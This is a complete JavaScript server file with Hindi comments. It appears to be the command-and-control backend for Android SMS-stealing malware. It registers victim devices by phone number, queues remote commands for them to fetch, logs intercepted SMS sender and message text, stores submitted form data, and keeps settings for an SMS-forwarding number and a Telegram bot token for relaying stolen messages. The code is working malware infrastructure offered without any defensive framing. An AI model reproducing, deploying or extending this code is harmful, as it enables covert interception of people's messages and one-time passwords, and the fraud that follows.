const path = require('path');
const sqlite3 = require('sqlite3').verbose();

// --- डेटाबेस सेटअप ---
const dbPath = path.join(process.env.VERCEL ? '/tmp' : '.', 'database.sqlite');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error("Error opening database", err.message);
    } else {
        console.log("Database connected successfully.");
        // टेबल बनाने का कोड
        db.serialize(() => {
            db.run(`CREATE TABLE IF NOT EXISTS devices (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, device_name TEXT, os_version TEXT, phone_number TEXT, battery_level INTEGER, last_seen DATETIME NOT NULL, created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
            db.run(`CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, command_type TEXT NOT NULL, command_data TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
            db.run(`CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, sender TEXT NOT NULL, message_body TEXT NOT NULL, received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
            db.run(`CREATE TABLE IF NOT EXISTS form_submissions (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, custom_data TEXT NOT NULL, submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP)`);
            db.run(`CREATE TABLE IF NOT EXISTS global_settings (setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, setting_value TEXT)`);
        });
    }
});

// --- मुख्य सर्वर लॉजिक ---
module.exports = async (req, res) => {
    // CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const { method, url } = req;
    
    const getBody = () => new Promise(resolve => {
        let data = '';
        req.on('data', chunk => { data += chunk; });
        req.on('end', () => resolve(data ? JSON.parse(data) : {}));
    });

    const reqBody = await getBody();
    const urlParts = url.split('?')[0].split('/').filter(Boolean);

    try {
        // 1. डिवाइस रजिस्ट्रेशन (POST /api/device/register)
        if (method === 'POST' && url.startsWith('/api/device/register')) {
            const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
            const now = new Date().toISOString();
            db.get('SELECT id FROM devices WHERE device_id = ?', [device_id], (err, row) => {
                if (row) {
                    db.run('UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?', [device_name, os_version, battery_level, phone_number, now, device_id]);
                } else {
                    db.run('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)', [device_id, device_name, os_version, battery_level, phone_number, now, now]);
                }
                return res.status(200).json({ status: 'success', message: 'Device data updated.' });
            });
        }

        // 2. डिवाइस लिस्ट (GET /api/devices)
        else if (method === 'GET' && url.startsWith('/api/devices')) {
            db.all('SELECT * FROM devices ORDER BY created_at ASC', [], (err, rows) => {
                if (err) return res.status(500).json({ error: err.message });
                const now = new Date();
                const devicesWithStatus = rows.map(d => ({ ...d, is_online: (now - new Date(d.last_seen)) / 1000 < 20 }));
                return res.status(200).json(devicesWithStatus);
            });
        }

        // 3. SMS फॉरवर्डिंग (POST/GET /api/config/sms_forward)
        else if (url.startsWith('/api/config/sms_forward')) {
            if (method === 'POST') {
                db.run("INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value", [reqBody.forward_number]);
                return res.status(200).json({ status: 'success', message: 'Forwarding number updated.' });
            }
            if (method === 'GET') {
                db.get("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'", [], (err, row) => {
                    return res.status(200).json({ forward_number: row ? row.setting_value : null });
                });
            }
        }
        
        // 4. टेलीग्राम सेटिंग्स (POST/GET /api/config/telegram)
        else if (url.startsWith('/api/config/telegram')) {
            if (method === 'POST') {
                db.run("INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value", [reqBody.telegram_bot_token]);
                db.run("INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value", [reqBody.telegram_chat_id]);
                return res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
            }
            if (method === 'GET') {
                let settings = {};
                db.get("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'", [], (err, row) => {
                    settings.telegram_bot_token = row ? row.setting_value : null;
                    db.get("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'", [], (err, row) => {
                        settings.telegram_chat_id = row ? row.setting_value : null;
                        return res.status(200).json(settings);
                    });
                });
            }
        }

        // 5. कमांड भेजना (POST /api/command/send)
        else if (method === 'POST' && url.startsWith('/api/command/send')) {
            const { device_id, command_type, command_data } = reqBody;
            db.run('INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)', [device_id, command_type, JSON.stringify(command_data), 'pending'], function(err) {
                return res.status(201).json({ status: 'success', message: 'Command queued.', command_id: this.lastID });
            });
        }

        // 6. पेंडिंग कमांड पाना (GET /api/device/{deviceId}/commands)
        else if (method === 'GET' && url.includes('/commands') && urlParts[1] === 'device' && urlParts.length === 4) {
            const deviceId = urlParts[2];
            db.all("SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'", [deviceId], (err, rows) => {
                if (rows && rows.length > 0) {
                    const ids = rows.map(c => c.id);
                    db.run(`UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`, ids);
                }
                const parsedCommands = rows.map(cmd => ({ ...cmd, command_data: JSON.parse(cmd.command_data) }));
                return res.status(200).json(parsedCommands);
            });
        }

        // 7. कमांड को एक्सेक्यूटेड मार्क करना (POST /api/command/{commandId}/execute)
        else if (method === 'POST' && url.includes('/execute') && urlParts[1] === 'command' && urlParts.length === 4) {
            const commandId = urlParts[2];
            db.run("UPDATE commands SET status = 'executed' WHERE id = ?", [commandId]);
            return res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
        }

        // 8. SMS लॉग करना (POST /api/device/{deviceId}/sms)
        else if (method === 'POST' && url.includes('/sms') && urlParts[1] === 'device' && urlParts.length === 4) {
            const deviceId = urlParts[2];
            db.run('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)', [deviceId, reqBody.sender, reqBody.message_body]);
            return res.status(201).json({ status: 'success', message: 'SMS logged.' });
        }

        // 9. फॉर्म डेटा सबमिट करना (POST /api/device/{deviceId}/forms)
        else if (method === 'POST' && url.includes('/forms') && urlParts[1] === 'device' && urlParts.length === 4) {
            const deviceId = urlParts[2];
            db.run('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)', [deviceId, reqBody.custom_data]);
            return res.status(201).json({ status: 'success', message: 'Form data submitted.' });
        }

        // 10. डिवाइस डिलीट करना (DELETE /api/device/{deviceId})
        else if (method === 'DELETE' && urlParts.length === 3 && urlParts[1] === 'device') {
            const deviceId = urlParts[2];
            db.serialize(() => {
                db.run('DELETE FROM devices WHERE device_id = ?', [deviceId]);
                db.run('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
                db.run('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
                db.run('DELETE FROM commands WHERE device_id = ?', [deviceId]);
            });
            return res.status(200).json({ status: 'success', message: 'Device and all related data deleted.' });
        }
        
        // 11. SMS डिलीट करना (DELETE /api/sms/{smsId})
        else if (method === 'DELETE' && urlParts.length === 3 && urlParts[1] === 'sms') {
            const smsId = urlParts[2];
            db.run('DELETE FROM sms_logs WHERE id = ?', [smsId]);
            return res.status(200).json({ status: 'success', message: 'SMS deleted.' });
        }

        else {
            res.status(404).json({ error: 'Not Found', requestedUrl: url });
        }

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal Server Error', details: error.message });
    }
};
